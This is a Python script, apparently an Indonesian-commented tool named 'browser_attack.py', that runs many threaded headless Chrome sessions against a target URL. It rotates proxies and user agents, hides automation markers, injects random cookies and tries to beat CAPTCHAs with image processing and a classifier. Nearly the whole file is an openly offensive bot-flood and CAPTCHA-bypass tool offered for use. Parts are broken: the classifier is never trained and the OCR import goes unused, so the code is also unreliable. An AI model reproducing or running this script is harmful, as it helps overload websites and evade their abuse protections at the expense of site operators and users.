import random
import time
import sys
import cv2
import numpy as np
from PIL import Image
from io import BytesIO
from threading import Thread
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from datetime import datetime
import requests
from sklearn.ensemble import RandomForestClassifier
from sklearn.preprocessing import StandardScaler
from sklearn.pipeline import Pipeline

# Konfigurasi Tesseract OCR
import pytesseract
pytesseract.pytesseract.tesseract_cmd = r'/usr/bin/tesseract'  # Sesuaikan path tesseract

# Pre-trained model (load your model or train a new one)
def load_model():
    # Example: Load a pre-trained model from a file
    # This model needs to be trained separately with labeled CAPTCHA data
    return RandomForestClassifier()

# Train model with sample CAPTCHA data
def train_model(model):
    # Placeholder for training logic
    # This function should be implemented with real CAPTCHA image data and labels
    pass

# Memuat proxy dari file
def load_proxies(proxy_file):
    with open(proxy_file, 'r') as f:
        proxies = f.readlines()
    return [proxy.strip() for proxy in proxies]

# Memuat user-agent dari file
def load_user_agents(user_agent_file):
    with open(user_agent_file, 'r') as f:
        user_agents = f.readlines()
    return [ua.strip() for ua in user_agents]

# Fungsi untuk format output
def format_output(ip_port, user_agent, cookie, captcha_solution, success):
    timestamp = datetime.now().strftime("%H:%M:%S")
    status = "SUCCESS" if success else "FAIL"
    print(f"TIME {timestamp} | {ip_port} | User Agent: {user_agent} | Cookie: {cookie} | Captcha Solution: {captcha_solution} | Status: {status}")

# Fungsi untuk menghasilkan cookies acak
def generate_random_cookies():
    return f"session_id={random.randint(1000000, 9999999)}; user_id={random.randint(100000, 999999)}"

# Fungsi untuk memproses gambar CAPTCHA menggunakan OpenCV
def preprocess_captcha_image(image):
    cv_image = np.array(image.convert('RGB'))
    cv_image = cv_image[:, :, ::-1].copy()  # Convert RGB to BGR

    gray_image = cv2.cvtColor(cv_image, cv2.COLOR_BGR2GRAY)
    thresholded_image = cv2.adaptiveThreshold(
        gray_image, 255, cv2.ADAPTIVE_THRESH_GAUSSIAN_C,
        cv2.THRESH_BINARY, 11, 2
    )

    kernel = np.ones((2, 2), np.uint8)
    cleaned_image = cv2.morphologyEx(thresholded_image, cv2.MORPH_CLOSE, kernel)
    cleaned_image = cv2.morphologyEx(cleaned_image, cv2.MORPH_OPEN, kernel)

    return cleaned_image

# Fungsi untuk menyelesaikan CAPTCHA menggunakan model machine learning
def solve_captcha(model, image_url):
    try:
        image_response = requests.get(image_url)
        image_bytes = BytesIO(image_response.content)
        captcha_image = Image.open(image_bytes)

        preprocessed_image = preprocess_captcha_image(captcha_image)
        feature_vector = preprocessed_image.flatten().reshape(1, -1)

        # Predict using the trained model
        captcha_text = model.predict(feature_vector)
        return captcha_text[0]
    except Exception as e:
        print(f"Error solving CAPTCHA: {e}")
        return None

# Fungsi untuk melakukan serangan browser-based menggunakan Selenium
def browser_attack(proxy, user_agent, target_url, model):
    try:
        options = uc.ChromeOptions()
        options.add_argument(f'--proxy-server={proxy}')
        options.add_argument(f'user-agent={user_agent}')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        service = Service(executable_path="/path/to/chromedriver")  # Sesuaikan path chromedriver
        driver = uc.Chrome(options=options, service=service)

        driver.get(target_url)

        cookies = driver.get_cookies()
        random_cookie = generate_random_cookies()
        cookie_str = "; ".join([f"{cookie['name']}={cookie['value']}" for cookie in cookies] + [random_cookie])

        captcha_image_element = driver.find_element(By.CSS_SELECTOR, 'img.captcha_image')
        image_url = captcha_image_element.get_attribute('src')

        captcha_solution = solve_captcha(model, image_url)
        if captcha_solution:
            print(f"Captcha solved: {captcha_solution}")
            format_output(proxy, user_agent, cookie_str, captcha_solution, True)
        else:
            format_output(proxy, user_agent, cookie_str, captcha_solution, False)
        
        driver.quit()

    except Exception as e:
        format_output(proxy, user_agent, "", "", False)

# Fungsi untuk memulai serangan browser dalam thread
def start_attack(proxy_list, user_agent_list, target_url, duration, model):
    timeout = time.time() + duration
    while time.time() < timeout:
        proxy = random.choice(proxy_list)
        user_agent = random.choice(user_agent_list)
        browser_attack(proxy, user_agent, target_url, model)

# Pengaturan utama
if len(sys.argv) != 6:
    print("Usage: python browser_attack.py [targetURL] [duration] [threads] [proxyFile] [userAgentFile]")
    sys.exit(1)

target_url = sys.argv[1]
duration = int(sys.argv[2])
threads = int(sys.argv[3])
proxy_file = sys.argv[4]
user_agent_file = sys.argv[5]

# Load proxies and user-agents
proxy_list = load_proxies(proxy_file)
user_agent_list = load_user_agents(user_agent_file)

# Load or train model
model = load_model()
train_model(model)

# Start threads for the attack
for i in range(threads):
    th = Thread(target=start_attack, args=(proxy_list, user_agent_list, target_url, duration, model))
    th.start()
    print(f"Thread {i+1} started for attack")
